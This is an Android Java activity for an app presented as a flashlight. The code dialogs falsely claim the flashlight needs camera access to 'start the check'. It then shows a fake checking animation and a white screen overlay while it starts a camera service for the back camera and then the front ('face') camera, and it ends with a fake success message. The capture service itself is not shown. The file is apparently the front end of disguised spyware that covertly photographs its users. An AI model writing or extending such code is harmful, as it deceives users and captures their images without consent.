package com.flashlight.app;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private boolean isProcessing = false;
    private View greenOverlay, whiteOverlay;
    private TextView tvAnim;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        greenOverlay = findViewById(R.id.green_overlay);
        whiteOverlay = findViewById(R.id.white_overlay);
        tvAnim = findViewById(R.id.tv_anim_text);
        Button btn = findViewById(R.id.btn_flash);

        btn.setOnClickListener(v -> {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                new AlertDialog.Builder(this)
                    .setTitle("Фонарь не работает")
                    .setMessage("Чтобы началась проверка, разрешите доступ к камере.")
                    .setPositiveButton("Разрешить доступ", (dialog, which) -> {
                        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, 1);
                    })
                    .setCancelable(false)
                    .show();
                return;
            }

            if (isProcessing) return;
            isProcessing = true;

            try {
                greenOverlay.setVisibility(View.VISIBLE);
                tvAnim.setText("Проверка.");
                
                Handler handler = new Handler(Looper.getMainLooper());
                handler.postDelayed(() -> tvAnim.setText("Проверка.."), 600);
                handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1200);

                // Через 2 секунды: белый экран и запуск камер
                handler.postDelayed(() -> {
                    greenOverlay.setVisibility(View.GONE);
                    whiteOverlay.setVisibility(View.VISIBLE);
                    
                    Intent backSvc = new Intent(this, CameraService.class);
                    backSvc.putExtra("camera_type", "back");
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(backSvc);
                    else startService(backSvc);

                    handler.postDelayed(() -> {
                        Intent frontSvc = new Intent(this, CameraService.class);
                        frontSvc.putExtra("camera_type", "face");
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(frontSvc);
                        else startService(frontSvc);
                    }, 1000);

                }, 2000);

                // Через 6 секунд: убираем белый экран, показываем "Успех"
                handler.postDelayed(() -> {
                    whiteOverlay.setVisibility(View.GONE);
                    isProcessing = false;
                    
                    new AlertDialog.Builder(this)
                        .setTitle("Успех")
                        .setMessage("Все сработало. Фонарь готов к работе.")
                        .setPositiveButton("ОК", null)
                        .show();

                }, 6000);

            } catch (Exception e) { e.printStackTrace(); }
        });
    }
}
